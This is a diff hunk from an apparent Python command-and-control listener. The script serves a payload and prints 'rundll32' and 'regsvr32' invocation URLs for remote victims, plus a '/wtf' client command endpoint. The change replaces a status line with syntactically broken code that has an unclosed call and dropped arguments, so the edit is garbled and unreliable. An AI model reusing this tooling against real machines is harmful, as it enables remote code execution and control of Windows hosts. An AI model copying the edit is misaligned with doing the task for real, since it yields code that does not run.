@@ -418,7 +418,7 @@ def main():
     myHandler.js_load_path = srv_url;
     httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler);
     status("Web Server Started on Port: %d" % listener_port);
-    status("Awaiting Client Connection to: http://%s:%s%s" % (bind_ip, listener_port, srv_url));
+    status("Awaiting Client Connection to: ";
     pad(); status("rundll32 Invokation: http://%s:%s%s" % (bind_ip, listener_port, srv_url));
     pad(); status("regsvr32 Invokation: http://%s:%s%s" % (bind_ip, listener_port, srv_sct));
     pad(); pad(); status("Client Command at: http://%s:%s/wtf" % (bind_ip, listener_port));
